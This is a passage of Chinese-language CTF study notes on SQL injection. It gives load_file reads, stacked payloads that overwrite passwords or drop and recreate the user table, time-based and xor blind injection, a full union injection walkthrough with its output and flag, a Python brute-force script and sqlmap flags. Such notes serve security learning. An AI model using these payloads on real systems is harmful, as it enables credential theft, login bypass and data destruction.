<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 指定的用户目录下的文件无法读取，if返回<span class="number">0</span>，打印所有的非数字开头的用户</span><br><span class="line">MariaDB [kali]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span>if(load_file(<span class="string">&#x27;/home/xiaodi/flag.txt&#x27;</span>)regexp(<span class="string">&#x27;ctfshow&#123;&#x27;</span>),<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> password           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> admin    <span class="operator">|</span> asdasdfadfasfasdf  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> user1    <span class="operator">|</span> safsdafsdfasfdsdfa <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">2</span> warnings (<span class="number">0.000</span> sec)</span><br><span class="line"></span><br><span class="line"># 读取具有一定权限的index.php文件，读取正确时if返回<span class="number">1</span>,<span class="number">1</span>无法匹配用户名，返回空</span><br><span class="line">MariaDB [kali]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span>if(load_file(<span class="string">&#x27;/var/www/html/index.php&#x27;</span>)regexp(<span class="string">&#x27;ctfshow&#123;5&#x27;</span>),<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span>, <span class="number">2</span> warnings (<span class="number">0.000</span> sec)</span><br></pre></td></tr></table></figure>

<p>上面那个是合并用法，下面单独列出来试试：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [kali]<span class="operator">&gt;</span> <span class="keyword">select</span> load_file(<span class="string">&#x27;/home/xiaodi/flag.txt&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> load_file(<span class="string">&#x27;/home/xiaodi/flag.txt&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>                               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.000</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [kali]<span class="operator">&gt;</span> <span class="keyword">select</span> load_file(<span class="string">&#x27;/var/www/html/index.php&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> load_file(<span class="string">&#x27;/var/www/html/index.php&#x27;</span>)                                     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&lt;</span>?php</span><br><span class="line">$flag<span class="operator">=</span>&quot;ctfshow&#123;54b3a029-69fd-4b1b-9227-ba171558021a&#125;&quot;;</span><br><span class="line">phpinfo();</span><br><span class="line"> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.000</span> sec)</span><br></pre></td></tr></table></figure>

<p>可以看到，能读取出文件内容的只有index.php。接下来看看权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xiaodi@xiaodi-test:~$ ll | grep flag</span><br><span class="line">-rw-rw-r--  1 xiaodi xiaodi     47  1月 22 10:12 flag.txt</span><br><span class="line">xiaodi@xiaodi-test:~$ ll /var/www/html/index.php</span><br><span class="line">-rw-r--r-- 1 root root 72  1月 22 10:57 /var/www/html/index.php</span><br></pre></td></tr></table></figure>

<h3 id="截断字符串"><a href="#截断字符串" class="headerlink" title="截断字符串"></a>截断字符串</h3><h4 id="指定位置截断指定字符串-substr-substring-mid"><a href="#指定位置截断指定字符串-substr-substring-mid" class="headerlink" title="指定位置截断指定字符串-substr/substring/mid"></a>指定位置截断指定字符串-substr/substring/mid</h4><p>截断字符串的函数有几个：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 函数(字符串,起始截断处(从<span class="number">1</span>开始),截断的字符串个数)</span><br><span class="line"><span class="keyword">select</span> substr(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="number">3</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">substring</span>(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="number">3</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> mid(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<h4 id="按字符左右截断-left-right"><a href="#按字符左右截断-left-right" class="headerlink" title="按字符左右截断-left/right"></a>按字符左右截断-left/right</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 从字符串左边获取一个字符</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"># 从字符串右边获取一个字符</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">right</span>(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<h4 id="查出指定字符串第一次出现的位置"><a href="#查出指定字符串第一次出现的位置" class="headerlink" title="查出指定字符串第一次出现的位置"></a>查出指定字符串第一次出现的位置</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 函数(单个字符串,被查询的字符串,<span class="number">4</span>)	<span class="keyword">function</span>(a,b,c)</span><br><span class="line"># 根据c开始的位置(从<span class="number">1</span>开始),从b查询a第一次出现的位置。</span><br><span class="line"><span class="keyword">select</span> locate(<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;ctfshow&#x27;</span>,<span class="number">4</span>) content;</span><br><span class="line"></span><br><span class="line"># instr获取的是字符串第一次出现的位置，但无法限制字符串的起始位置</span><br><span class="line"><span class="keyword">select</span> instr(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="替换字符串"><a href="#替换字符串" class="headerlink" title="替换字符串"></a>替换字符串</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># replace,将字符串特定字符串替换为指定字符串</span><br><span class="line"><span class="keyword">select</span> replace(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;ow&#x27;</span>,<span class="string">&#x27;ed&#x27;</span>) content;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="update堆叠更新用户密码"><a href="#update堆叠更新用户密码" class="headerlink" title="update堆叠更新用户密码"></a>update堆叠更新用户密码</h3><p>在已知表名字的的情况下，可以尝试直接改写用户的密码实现注入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test1 <span class="keyword">where</span> username<span class="operator">=</span><span class="number">0</span>;<span class="keyword">update</span>`ctfshow_user`<span class="keyword">set</span>`pass`<span class="operator">=</span><span class="number">0x31333134</span>;</span><br><span class="line"># 意思是在原定的<span class="keyword">select</span>的语句后面使用分号，插入意外的<span class="keyword">update</span>语句更新ctfshow_user列表的所有内容</span><br><span class="line"></span><br><span class="line"><span class="comment">-- update个人感觉有点危险，可以试着加个where限制更新的用户，防止更新了指定列表的全部用户的密码</span></span><br><span class="line"><span class="keyword">update</span>`test1`<span class="keyword">set</span>`pass`<span class="operator">=</span><span class="string">&#x27;1314&#x27;</span><span class="keyword">where</span>`username`<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="select绕过密码验证"><a href="#select绕过密码验证" class="headerlink" title="select绕过密码验证"></a>select绕过密码验证</h3><p>具体看 <code>web196</code> 题，使用的是select返回字符串作为密码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>; </span><br><span class="line"><span class="comment"># 如果 $username=&#x27;1;select(0)&#x27; ，补充完整如下的话：</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = 1;select(0);&quot;</span>;</span><br><span class="line"><span class="comment"># sql如果得到的结果就是密码的话，使用堆叠注入的select(0)去顶替真正的密码，直接实现使用 &#123;用户名:1;select(0),密码:0&#125;登录。</span></span><br></pre></td></tr></table></figure>

<h3 id="单表用户登录绕过"><a href="#单表用户登录绕过" class="headerlink" title="单表用户登录绕过"></a>单表用户登录绕过</h3><p>之所以这么说，也是有原因的。如果是多表，八成会报错。本地查询测试的时候就报错了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 对应的sql注入语句</span></span><br><span class="line">select pass <span class="keyword">from</span> ctfshow_user where username=<span class="variable">$username</span></span><br><span class="line"><span class="comment"># 对应的用户名和密码输入</span></span><br><span class="line">username: <span class="number">1</span>;show tables</span><br><span class="line">password: ctfshow_user</span><br><span class="line"><span class="comment"># 意思是：使用show tables展示出当前的唯一一个表名，密码直接使用表名进行登录，前提是知道表名。</span></span><br></pre></td></tr></table></figure>

<h3 id="修改字段名进行绕过"><a href="#修改字段名进行绕过" class="headerlink" title="修改字段名进行绕过"></a>修改字段名进行绕过</h3><h4 id="情况1："><a href="#情况1：" class="headerlink" title="情况1："></a>情况1：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 情况1：（字段1改名为没存在过的新字段名，字段2改成字段1的名字）</span></span><br><span class="line"># 原始的<span class="keyword">sql</span>句子</span><br><span class="line"><span class="keyword">select</span> pass <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username<span class="operator">=</span>$username</span><br><span class="line"># 对应的用户名和密码</span><br><span class="line">username: <span class="number">1</span>;<span class="keyword">alter</span> <span class="keyword">table</span> `ctfshow_user` change `pass` `feng` <span class="type">varchar</span>(<span class="number">255</span>); <span class="keyword">alter</span> <span class="keyword">table</span> `ctfshow_user` change `id` `pass` <span class="type">varchar</span>(<span class="number">255</span>)</span><br><span class="line">password: <span class="number">0</span></span><br><span class="line"># 修改完成后对pass字段进行数值爆破即可</span><br></pre></td></tr></table></figure>

<h4 id="情况2：交换字段名，使用已泄露的用户名作为密码登录"><a href="#情况2：交换字段名，使用已泄露的用户名作为密码登录" class="headerlink" title="情况2：交换字段名，使用已泄露的用户名作为密码登录"></a>情况2：交换字段名，使用已泄露的用户名作为密码登录</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username: <span class="number">0</span>;<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change `username` `pass2` <span class="type">varchar</span>(<span class="number">100</span>);<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change `pass` `username` <span class="type">varchar</span>(<span class="number">100</span>);<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change `pass2` `pass` <span class="type">varchar</span>(<span class="number">100</span>)</span><br><span class="line">password: <span class="number">0</span></span><br><span class="line"># 实现username字段和pass字段互相交换后，可以利用已经泄露的用户名进行登录</span><br><span class="line"># 注意，交换后用户名就是密码，密码就是用户名</span><br><span class="line">username: <span class="number">0</span></span><br><span class="line">password: userAUTO # 这个是前期泄露的用户名</span><br></pre></td></tr></table></figure>



<h3 id="删-创-插"><a href="#删-创-插" class="headerlink" title="删+创+插"></a>删+创+插</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username: <span class="number">0</span>;<span class="keyword">drop</span> <span class="keyword">table</span> ctfshow_user;<span class="keyword">create</span> <span class="keyword">table</span> ctfshow_user(`username` <span class="type">varchar</span>(<span class="number">100</span>),`pass` <span class="type">varchar</span>(<span class="number">100</span>));<span class="keyword">insert</span> ctfshow_user(`username`,`pass`)<span class="keyword">value</span>(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">password: <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>修改成功后再使用1和2进行登录即可</p>
<h4 id="删除指定表（危险操作）"><a href="#删除指定表（危险操作）" class="headerlink" title="删除指定表（危险操作）"></a>删除指定表（危险操作）</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> ctfshow_user;</span><br></pre></td></tr></table></figure>

<h4 id="重新创建指定表"><a href="#重新创建指定表" class="headerlink" title="重新创建指定表"></a>重新创建指定表</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> ctfshow_user(`username` <span class="type">varchar</span>(<span class="number">100</span>),`pass` <span class="type">varchar</span>(<span class="number">100</span>));</span><br></pre></td></tr></table></figure>

<h4 id="插入语句可以无init"><a href="#插入语句可以无init" class="headerlink" title="插入语句可以无init"></a>插入语句可以无init</h4><p>注意，插入语句可以带 <code>init</code> 或者不带 <code>init</code> .</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ctfshiow_user (`username`,`pass`)<span class="keyword">value</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">insert</span> ctfshow_user(`username`,`pass`)<span class="keyword">value</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果条件允许的话，可以尝试直接插入用户名和密码。</p>
</blockquote>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注注重的是延时函数，利用反应时间来测试答案的正确性。也正如此，很大程度上极其容易受到网络波动的影响。</p>
<h3 id="SQL-sleep"><a href="#SQL-sleep" class="headerlink" title="SQL-sleep"></a>SQL-sleep</h3><p>十分普通的sql延时函数，常用泛用没什么问题，能以秒为单位延时。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sleep(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>

<h3 id="benchmark大量计算充当延迟"><a href="#benchmark大量计算充当延迟" class="headerlink" title="benchmark大量计算充当延迟"></a>benchmark大量计算充当延迟</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">benchmark(<span class="number">3500000</span>,md5(<span class="string">&#x27;www&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>利用大量的计算量来充当延迟，具体延时多少还是得使用BP去测试。这个是要消耗服务器性能的。</p>
<h3 id="笛卡尔积–大量查询形成延时"><a href="#笛卡尔积–大量查询形成延时" class="headerlink" title="笛卡尔积–大量查询形成延时"></a>笛卡尔积–大量查询形成延时</h3><p>利用对某个大体量数据库进行查询，查询的耗时就是我们需要的延时。一般情况下会堆叠到三层，具体延时多少还是得自己测试。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.tables a, information_schema.tables b, information_schema.tables c)</span><br><span class="line"># 具体使用</span><br><span class="line">if(<span class="number">1</span><span class="operator">&gt;</span><span class="number">0</span>,(<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.tables a, information_schema.tables b, information_schema.tables c),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>





<h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><p>([极客大挑战 2019]LoveSQL)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">这里使用的工具是：hackbar</span><br><span class="line"></span><br><span class="line"><span class="comment">#传统的SQL手工注入流程：</span></span><br><span class="line">检测是否存在漏洞=&gt;测注入点(回显点)=&gt;爆库=&gt;爆表=&gt;爆字段=&gt;爆字段值=&gt;得到flag</span><br><span class="line"></span><br><span class="line">好了，开始手注了：</span><br><span class="line"><span class="number">1</span>.测试列数</span><br><span class="line">        /check.php?username=<span class="number">1</span><span class="string">&#x27; order by 1 %23&amp;password=123</span></span><br><span class="line"><span class="string">    此时返回正常的：</span></span><br><span class="line"><span class="string">        NO,Wrong username password！！！</span></span><br><span class="line"><span class="string">    刚好测到4时，出现报错：</span></span><br><span class="line"><span class="string">        /check.php?username=4&#x27;</span> order by <span class="number">1</span> %<span class="number">23</span>&amp;password=<span class="number">123</span></span><br><span class="line">    回显报错是：</span><br><span class="line">         Unknown column <span class="string">&#x27;4&#x27;</span> in <span class="string">&#x27;order clause&#x27;</span></span><br><span class="line">    说明列数为<span class="number">3</span></span><br><span class="line"><span class="number">2</span>.测试回显点</span><br><span class="line">    这里采用的是联合查询</span><br><span class="line">        /check.php?username=<span class="number">4</span><span class="string">&#x27; union select 1,2,3 %23&amp;password=123                                                                                  &#x27;</span></span><br><span class="line">    output:</span><br><span class="line">        Hello <span class="number">2</span>！</span><br><span class="line">        Your password is <span class="string">&#x27;3&#x27;</span></span><br><span class="line">    返回的信息有<span class="string">&#x27;2&#x27;</span>和<span class="string">&#x27;3&#x27;</span>作为回显点，那么我们就可以……嘿嘿嘿……</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.爆库</span><br><span class="line">    这个爆库是有个大前提的，就是它必须自带information_schema表</span><br><span class="line">    这个是Mysql5.<span class="number">0</span>开始系统自带的数据表，同时还有其它数据表也是系统自带的</span><br><span class="line">    这里先按下不表</span><br><span class="line"></span><br><span class="line">    尝试爆出当前 <span class="string">&#x27;数据库名&#x27;</span> 和 <span class="string">&#x27;版本信息&#x27;</span> :</span><br><span class="line">        /check.php?username=<span class="number">4</span><span class="string">&#x27; union select 1,database(),version() %23&amp;password=123                                                                                  &#x27;</span></span><br><span class="line">    output:</span><br><span class="line">        Hello geek！</span><br><span class="line">        Your password is <span class="string">&#x27;10.3.18-MariaDB&#x27;</span></span><br><span class="line">    说明当前数据库是<span class="string">&#x27;geek&#x27;</span>,版本是<span class="string">&#x27;10.3.18-MariaDB&#x27;</span>,</span><br><span class="line">    符合使用那个特殊表的条件</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.爆表</span><br><span class="line">    使用information_schema <span class="string">&#x27;爆表名&#x27;</span> :(显示问题，分成几行写)</span><br><span class="line">        /check.php?username=<span class="number">4</span><span class="string">&#x27; union select 1,</span></span><br><span class="line"><span class="string">        2,group_concat(table_name) from </span></span><br><span class="line"><span class="string">        information_schema.tables where table_schema=database() %23</span></span><br><span class="line"><span class="string">        &amp;password=123                                                           &#x27;</span></span><br><span class="line">    </span><br><span class="line">    output:</span><br><span class="line">        Hello <span class="number">2</span>！</span><br><span class="line">        Your password is <span class="string">&#x27;geekuser,l0ve1ysq1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.爆字段</span><br><span class="line">    尝试爆刚刚得到表的相关字段(因为<span class="string">&#x27;geekuser&#x27;</span>表爆不出重要信息，省略)</span><br><span class="line">        /check.php?username=<span class="number">4</span><span class="string">&#x27; union select 1,</span></span><br><span class="line"><span class="string">        group_concat(column_name),3 from</span></span><br><span class="line"><span class="string">         information_schema.columns where</span></span><br><span class="line"><span class="string">          table_name=&#x27;</span>l0ve1ysq1<span class="string">&#x27;%password=123                                   &#x27;</span></span><br><span class="line">    爆出的信息：</span><br><span class="line">        Hello <span class="number">2</span>！</span><br><span class="line">        Your password is <span class="string">&#x27;id,username,password&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>.爆字段值</span><br><span class="line">    找到了库名，表名，只需要爆出字段值就能找到目标账户信息了：</span><br><span class="line">        /check.php?username=<span class="number">1</span><span class="string">&#x27; union select 1,</span></span><br><span class="line"><span class="string">        group_concat(username,&#x27;</span>&lt;br&gt;<span class="string">&#x27;),group_concat(password,&#x27;</span>&lt;br&gt;<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        from geek.l0ve1ysq1 %23&amp;password=1</span></span><br><span class="line"><span class="string">    output:</span></span><br><span class="line"><span class="string">        Hello</span></span><br><span class="line"><span class="string">            1cl4y,2glzjin,3Z4cHAr7zCr,40xC4m3l,5Ayrain,6Akko,7fouc5,8fouc5,9fouc5,10fouc5,11fouc5,12fouc5,13fouc5,14fouc5,15leixiao,16flag！</span></span><br><span class="line"><span class="string">        Your password is</span></span><br><span class="line"><span class="string">            &#x27;</span>wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag&#123;a2791aca-<span class="number">88</span>f6-<span class="number">4</span>c0c-<span class="number">99</span>f8-<span class="number">4291</span>bff1dcfc&#125;<span class="string">&#x27;                                                     &#x27;</span></span><br><span class="line">    <span class="string">&#x27;末尾处有flag：&#x27;</span></span><br><span class="line">        flag&#123;a2791aca-<span class="number">88</span>f6-<span class="number">4</span>c0c-<span class="number">99</span>f8-<span class="number">4291</span>bff1dcfc&#125;    </span><br></pre></td></tr></table></figure>

<p>SQL注入流程</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">布尔型盲注：根据返回页面判断条件真假</span><br><span class="line"></span><br><span class="line">时间型盲注：用页面返回时间是否增加判断是否存在注入</span><br><span class="line"></span><br><span class="line">基于错误的注入：页面会返回错误信息</span><br><span class="line"></span><br><span class="line">联合查询注入：可以使用union的情况下</span><br><span class="line"></span><br><span class="line">堆查询注入：可以同时执行多条语句</span><br></pre></td></tr></table></figure>

<p>注入技巧和方法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 数据库异或注入，有关脚本就不放了，放下有关的<span class="keyword">SQL</span>语句：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>(length(database()));</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>(ord(<span class="built_in">SUBSTRING</span>(database(),&#123;&#125;,<span class="number">1</span>))<span class="operator">=</span>&#123;&#125;);</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>((<span class="keyword">SELECT</span>(ord(<span class="built_in">SUBSTRING</span>(GROUP_CONCAT(table_name),&#123;&#125;,<span class="number">1</span>)))<span class="keyword">FROM</span>(information_schema.tables)<span class="keyword">where</span>(table_schema<span class="operator">=</span>database()))<span class="operator">=</span>&#123;&#125;);</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>((<span class="keyword">SELECT</span>(ord(<span class="built_in">SUBSTRING</span>(GROUP_CONCAT(column_name),&#123;&#125;,<span class="number">1</span>)))<span class="keyword">FROM</span>(information_schema.columns)<span class="keyword">where</span>(table_name<span class="operator">=</span>&quot;F1naI1y&quot;))<span class="operator">=</span>&#123;&#125;);</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>((<span class="keyword">select</span>(ord(<span class="built_in">SUBSTRING</span>(GROUP_CONCAT(password),&#123;&#125;,<span class="number">1</span>)))<span class="keyword">from</span>(geek.F1naI1y))<span class="operator">=</span>&#123;&#125;);</span><br></pre></td></tr></table></figure>

<p>相关脚本（其实可以按照需求写）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: mochu7</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_injection</span>(<span class="params">url</span>):</span><br><span class="line">        flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        strings = string.printable</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> strings:</span><br><span class="line">                payload = <span class="string">&#x27;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#x27;</span>.<span class="built_in">format</span>(num,<span class="built_in">ord</span>(i))</span><br><span class="line">                post_data = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">                res = requests.post(url=url,data=post_data)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                    flag += i</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://64368c9f-dd87-4c49-b9a1-d4b82e98c87a.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">    blind_injection(url)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="注入函数"><a href="#注入函数" class="headerlink" title="注入函数"></a>注入函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version()	-- 查询数据库版本</span><br><span class="line">user()		-- 查数据库使用者名</span><br><span class="line">database()	-- 数据库</span><br><span class="line">to_base64()	-- 将数据加密为base64</span><br></pre></td></tr></table></figure>

<h2 id="其它注入-（limit）"><a href="#其它注入-（limit）" class="headerlink" title="其它注入-（limit）"></a>其它注入-（limit）</h2><h3 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h3><p>具体详情：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html#reply">大牛博客</a></p>
<p><code>mysql 5</code> 的版本。</p>
<p>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的。</p>
<h4 id="into"><a href="#into" class="headerlink" title="into"></a>into</h4><p>需要写入shell的权限</p>
<h4 id="procedure"><a href="#procedure" class="headerlink" title="procedure"></a>procedure</h4><p>组合使用：  <code>procedure analyse</code> </p>
<p>范例如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tables limit <span class="number">0</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,database(),<span class="number">0x3a</span>)),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>这是结合报错注入的。</p>
<h2 id="注入工具（SQLMAP）"><a href="#注入工具（SQLMAP）" class="headerlink" title="注入工具（SQLMAP）"></a>注入工具（SQLMAP）</h2><h3 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h3><h4 id="常用-使用过的sqlmap语法"><a href="#常用-使用过的sqlmap语法" class="headerlink" title="常用/使用过的sqlmap语法"></a>常用/使用过的sqlmap语法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">-u 				<span class="comment"># 指定URL</span></span><br><span class="line">-p				<span class="comment"># 指定爆破的参数</span></span><br><span class="line">-r 				<span class="comment"># 指定数据包文件</span></span><br><span class="line">-D				<span class="comment"># 指定库名</span></span><br><span class="line">-T				<span class="comment"># 指定表名</span></span><br><span class="line">-C				<span class="comment"># 指定列名</span></span><br><span class="line">--user-agent 	 <span class="comment"># 指定访问的ua头</span></span><br><span class="line">--referer		 <span class="comment"># 指定从哪个地方（网站）来</span></span><br><span class="line">--data <span class="string">&quot;id=1&quot;</span>	 <span class="comment"># POST数据的指定方式</span></span><br><span class="line"></span><br><span class="line">--header=Content-Type:text/plain <span class="comment"># 指定文件头</span></span><br><span class="line">--metnod=PUT				   <span class="comment"># 指定请求方式</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 模糊查询库、表、列名</span></span><br><span class="line">--dbs			<span class="comment"># 获取数据库</span></span><br><span class="line">--tables		<span class="comment"># 获取表名</span></span><br><span class="line">--columns		<span class="comment"># 获取字段（列名）</span></span><br><span class="line">--dump 			<span class="comment"># 获取列值</span></span><br></pre></td></tr></table></figure>

<p>鉴权：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--safe-url=<span class="string">&quot;http://xxxx/xxxx&quot;</span> 	<span class="comment"># 访问鉴权链接（访问流程是访问一次鉴权链接再访问-u指定的指定链接）</span></span><br><span class="line">--safe-freq=1				   <span class="comment"># 应该是访问鉴权链接的次数</span></span><br></pre></td></tr></table></figure>

<p>攻击载荷/闭合sql语句</p>
